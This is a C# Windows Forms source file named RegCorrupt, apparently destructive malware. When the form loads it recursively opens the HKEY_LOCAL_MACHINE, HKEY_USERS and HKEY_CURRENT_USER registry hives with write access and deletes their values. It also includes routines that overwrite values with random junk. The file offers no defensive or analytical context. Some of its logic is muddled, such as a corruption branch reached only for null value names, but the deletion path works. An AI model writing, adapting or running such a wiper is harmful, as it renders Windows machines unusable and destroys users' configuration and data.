using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Security;
using System.Security.AccessControl;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RegCorrupt
{
    public partial class Form1 : Form
    {
        Random rand = new Random(DateTime.Now.Millisecond);

        public Form1()
        {
            InitializeComponent();
            LoadSubKeys(Registry.LocalMachine);
            LoadSubKeys(Registry.Users);
            LoadSubKeys(Registry.CurrentUser);
        }

        public void LoadSubKeys(RegistryKey path)
        {
            foreach(string key in path.GetSubKeyNames())
            {
                try { LoadSubKeys(path.OpenSubKey(key, true)); }
                catch (Exception) { }
            }

            foreach (string value in path.GetValueNames())
            {
                if (value != null)
                    path.DeleteValue(value);
                else
                    CorruptValue(path, value);
            }
        }

        public void CorruptValue(RegistryKey path, string value)
        {
            switch (path.GetValueKind(value))
            {
                case RegistryValueKind.Binary: path.SetValue(value, CorruptBinary(value)); break;
                case RegistryValueKind.String: path.SetValue(value, CorruptTypeString()); break;
                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord: path.SetValue(value, CorruptDQWord()); break;
                case RegistryValueKind.MultiString:
                    for (int i = 0; i < 5; i++)
                        path.SetValue(value, CorruptTypeString());
                    break;
            }
        }

        public string CorruptTypeString()
        {
            string corrupted = "";
            corrupted += (char)rand.Next(32, 127);

            return corrupted;
        }

        public byte[] CorruptBinary(string value)
        {
            byte[] arr = new byte[value.Length];

            for(int i = 0; i < value.Length; i++)
            {
                arr[i] = (byte)rand.Next(32, 127);
            }

            return arr;
        }

        public string CorruptDQWord()
        {
            return "/!@$!@#!@%!%%!?@?!@%!@";
        }
    }
}
